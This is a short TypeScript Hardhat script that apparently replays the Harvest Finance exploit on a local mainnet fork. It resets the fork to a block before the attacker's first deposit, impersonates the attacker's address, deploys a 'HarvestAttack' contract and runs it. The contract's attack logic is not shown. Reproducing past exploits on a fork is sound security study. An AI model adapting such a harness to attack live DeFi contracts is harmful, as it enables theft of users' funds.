import { ethers, reset, RPC_URL } from "../setup";
import { IWETH9 } from "../typechain-types";

const HACKER = "0xF224ab004461540778a914ea397c589b677E27bb";
const WETH9 = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";


async function main() {
	// state of the contract before the first deposit of the hacker
	await reset(RPC_URL, 11129473);

    const hacker = await ethers.getImpersonatedSigner(HACKER);

    const harvest = await ethers.deployContract("HarvestAttack", [], {
        signer: hacker
    });

    await harvest.waitForDeployment();

    // const weth9 = await ethers.getContractAt("IWETH9", WETH9);

    // const balance = await ethers.provider.getBalance(HACKER);
    // console.log(ethers.formatEther(balance));

    // console.log(await ethers.provider.getBalance(HACKER));
	// console.log(await weth9.balanceOf(HACKER));

    await harvest.test();
}

main();
